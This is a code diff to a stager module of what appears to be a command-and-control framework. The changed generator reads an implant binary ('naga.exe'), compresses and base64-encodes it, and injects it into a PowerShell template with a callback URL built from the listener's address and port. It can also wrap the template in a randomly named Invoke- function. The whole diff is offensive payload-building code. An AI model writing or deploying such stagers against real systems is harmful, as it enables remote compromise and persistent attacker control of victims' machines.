@@ -1,6 +1,7 @@
 import logging
 from core.utils import gen_random_string
 from core.teamserver.stager import Stager
+from core.teamserver.utils import dotnet_deflate_and_encode
 
 class STStager(Stager):
     def __init__(self):
@@ -18,14 +19,14 @@ class STStager(Stager):
         }
 
     def generate(self, listener):
-        with open('core/teamserver/stagers/templates/posh.ps1') as template:
-            template = template.read()
-            function_name = gen_random_string(6).upper()
+        with open('./core/teamserver/data/naga.exe', 'rb') as dll:
+            with open('core/teamserver/stagers/templates/posh.ps1') as template:
+                template = template.read()
+                c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"
 
-            c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"
-
-            if bool(self.options['AsFunction']['Value']) is True:
-                template = f"""function Invoke-{function_name}
+                if bool(self.options['AsFunction']['Value']) is True:
+                    function_name = gen_random_string(6).upper()
+                    template = f"""function Invoke-{function_name}
 {{
     [CmdletBinding()]
     param (
@@ -36,7 +37,10 @@ class STStager(Stager):
 }}
 Invoke-{function_name} -Url "{c2_url}"
 """
-            else:
-                template = template.replace("$Url", f'"{c2_url}"')
+                else:
+                    template = template.replace("$Url", f'"{c2_url}"')
 
-            return template
+                dll = dll.read()
+                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(dll))
+                template = template.replace("DATA_LENGTH", str(len(dll)))
+                return template
